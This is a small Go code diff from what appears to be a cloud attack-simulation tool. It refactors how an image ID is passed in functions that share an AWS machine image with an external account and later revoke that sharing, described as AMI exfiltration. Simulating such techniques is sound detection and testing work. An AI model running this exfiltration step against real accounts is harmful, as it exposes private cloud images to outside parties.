@@ -50,7 +50,7 @@ func detonate(params map[string]string) error {
 
 	log.Println("Exfiltrating AMI " + amiId + " by sharing it with an external AWS account")
 	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
-		ImageId: aws.String(amiId),
+		ImageId: &amiId,
 		LaunchPermission: &types.LaunchPermissionModifications{
 			Add: amiPermissions,
 		},
@@ -69,7 +69,7 @@ func revert(params map[string]string) error {
 
 	log.Println("Reverting exfiltration of AMI " + amiId + " by removing cross-account sharing")
 	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
-		ImageId: aws.String(amiId),
+		ImageId: &amiId,
 		LaunchPermission: &types.LaunchPermissionModifications{
 			Remove: amiPermissions,
 		},
